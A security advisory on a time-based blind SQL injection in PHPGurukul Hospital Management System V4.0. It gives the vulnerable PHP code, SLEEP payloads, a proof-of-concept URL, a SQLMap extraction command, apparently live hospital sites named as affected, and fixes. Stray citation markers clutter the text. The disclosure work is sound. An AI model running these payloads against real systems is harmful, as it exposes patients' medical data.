# SQL Injection Vulnerability in PHPGurukul Hospital Management System (HMS) V4.0 (User Module)

## 1. Vulnerability Overview

| Field | Content |
| :--- | :--- |
| **System Name** | PHPGurukul Hospital Management System (HMS) |
| **Vendor Website** | [cite_start][https://phpgurukul.com/](https://phpgurukul.com/) [cite: 163] |
| **Affected Version** | [cite_start]V4.0 (Latest) and some older versions [cite: 164] |
| **Vulnerability Type** | [cite_start]SQL Injection (SQLi) [cite: 165] |
| **Vulnerable File** | [cite_start]`/hospital/hms/appointment-history.php` [cite: 166] |
| **Severity** | [cite_start]**High** (Sensitive Medical Data Leakage, Privilege Escalation) [cite: 167] |
| **Reporter** | [cite_start]yan1451 [cite: 160] |
| **Date** | [cite_start]2026-01-30 [cite: 160] |

---

## 2. Vulnerability Description

[cite_start]A hidden **SQL Injection vulnerability** was discovered in the user module (`/hospital/hms/appointment-history.php`) of the **PHPGurukul Hospital Management System (HMS) V4.0**[cite: 170].

The vulnerability exists in the logic that handles the "Cancel Appointment" function, controlled by the `cancel` parameter. [cite_start]An attacker with a standard patient account (low privilege) can trigger this vulnerability by appending `&cancel=1` to the request URL[cite: 171].

The backend code directly concatenates the unfiltered `id` parameter into a SQL `UPDATE` statement. [cite_start]This allows an attacker to use Time-based Blind injection techniques to execute arbitrary SQL commands, potentially dumping sensitive information such as doctor accounts, patient medical records, and administrator credentials[cite: 171].

---

## 3. Technical Analysis

### Vulnerable Code Logic
The vulnerability is located in `appointment-history.php`. The code checks if the `$_GET['cancel']` parameter exists. [cite_start]If it does, it directly takes the `$_GET['id']` value and inserts it into the SQL query without any validation or parameter binding[cite: 174].

**File:** `hospital/hms/appointment-history.php`

```php
// File: hospital/hms/appointment-history.php

if(isset($_GET['cancel'])) // Trigger condition
{
    // [Vulnerability] Direct concatenation of 'id' into the UPDATE statement
    mysqli_query($con,"update appointment set userStatus='0' where id = '".$_GET['id']."'");
    
    $_SESSION['msg']="Your appointment canceled !!";
}
```
[cite_start][cite: 177-181]

<img width="415" height="247" alt="77ac6cb77f2cb42c303b9123e335b87d" src="https://github.com/user-attachments/assets/db024cb0-dccf-40d9-a2df-f43eb90231e5" />

### Exploit Conditions
* [cite_start]**Access Level:** Low (Requires a standard User/Patient account)[cite: 183].
* [cite_start]**Trigger:** The URL must explicitly include `cancel=1` to enter the vulnerable code block[cite: 184].

**Payload (Time-Based Blind):**
```sql
1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--+
```
[cite_start][cite: 186]

---

## 4. Proof of Concept (Reproduction Steps)

1.  [cite_start]**Setup:** Deploy PHPGurukul HMS V4.0 on a local server (Localhost)[cite: 188].
2.  [cite_start]**Access:** Log in with a standard patient account[cite: 189].
3.  **Attack:** Navigate to the "Appointment History" page. Modify the URL (via browser or Burp Suite) to include `&cancel=1` and set the `id` to the payload:
    ```http
    http://localhost/Hospital-Management-System-PHP/hospital/hms/appointment-history.php?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--+&cancel=1
    ```
    [cite_start][cite: 190]
4.  [cite_start]**Result:** The server response time is delayed by approximately **5 seconds**, confirming that the `SLEEP(5)` command was successfully executed by the database[cite: 191].

<img width="415" height="249" alt="f8beed42e249d77d685e331d01502e16" src="https://github.com/user-attachments/assets/c5a484be-7114-407c-a33f-96dff107ae8d" />

---

## 5. Deep Verification & Automated Testing

To further confirm the severity and the ability to extract data, the vulnerability was verified using SQLMap and Burp Suite.

### 5.1 Database Enumeration (SQLMap)
**Objective:** Extract database core fields using a standard user session.
[cite_start]**Tool:** SQLMap (Level 3)[cite: 213].
**Command:**
```bash
python sqlmap.py -r appoint.txt -p id --technique=T --level=3 --dbms=mysql --batch --current-user --current-db
```
**Result:** SQLMap successfully extracted the highest privilege account information:
* [cite_start]**Current User:** `'root@localhost'` [cite: 215]
* [cite_start]**Current Database:** `'hms'` [cite: 216]

<img width="415" height="166" alt="580de75ff4594650cf8a15bb7f1c6647" src="https://github.com/user-attachments/assets/33bee1aa-0444-4fbf-bba9-79e9709e8024" />

### 5.2 Injection Logic Validation (Burp Suite)
[cite_start]**Payload:** `id=1' OR SLEEP(5)--+&cancel=update` [cite: 218]
[cite_start]**Observation:** The server response time was **10,053 ms** (approx. 10 seconds)[cite: 219].
**Analysis:** The test account had 2 appointment records. The `OR` logic forced the database to execute `SLEEP(5)` for *every* record in the table, resulting in a total delay of 2 * 5s = 10s. [cite_start]This confirms the SQL statement was successfully hijacked[cite: 220].

<img width="415" height="232" alt="8f6a619894085cb2d62a26bc6ad09f30" src="https://github.com/user-attachments/assets/8883b35e-0c6a-424b-b56f-b3c50ce1aa92" />

---

## 6. Publicly Affected Instances (Internet Case Studies)

A fingerprint search (Fingerprint: "Hospital Management System" / URL structure) confirmed that this software is widely deployed.

* [cite_start]**Case 1:** `http://beeyo.et/hms/` (Ethiopian medical site; login page matches fingerprint) [cite: 197-198].
* [cite_start]**Case 2:** `http://apexcareshospital.com/hms/` (Apex Cares Hospital; backend path matches) [cite: 200-201].
* [cite_start]**Case 3:** `http://49.249.28.218:8081/.../hms/admin/` (IP-based site retaining full path characteristics) [cite: 203-204].

<img width="416" height="288" alt="1a6d76d66b1761de7f3b7c32aa2a1121" src="https://github.com/user-attachments/assets/9da2cc17-e3ce-4eba-8994-62b86a8258b5" />
<img width="415" height="292" alt="f111d51f5579424b743aef476d44a110" src="https://github.com/user-attachments/assets/7f53d9ab-b8f3-4b2a-8a3d-d555c20c743d" />
<img width="416" height="274" alt="ea3a530f9640b2449f2a0c3f9afdba08" src="https://github.com/user-attachments/assets/5b3a3558-91f3-4402-992c-c68c8680932f" />

---

## 7. Remediation Suggestions

1.  **Use Prepared Statements:** The vendor must update the code to use `mysqli_prepare` and `mysqli_stmt_bind_param`. [cite_start]This is the only effective way to prevent SQL injection by separating data from execution logic[cite: 206].
2.  **Integer Casting:** Since the `id` field is expected to be a number, use `intval()` to force type conversion:
    ```php
    $id = intval($_GET['id']);
    ```
    [cite_start][cite: 207]
3.  [cite_start]**WAF Configuration:** Configure Web Application Firewalls to intercept requests to `appointment-history.php` containing SQL keywords (e.g., `UNION`, `SELECT`, `SLEEP`)[cite: 208].
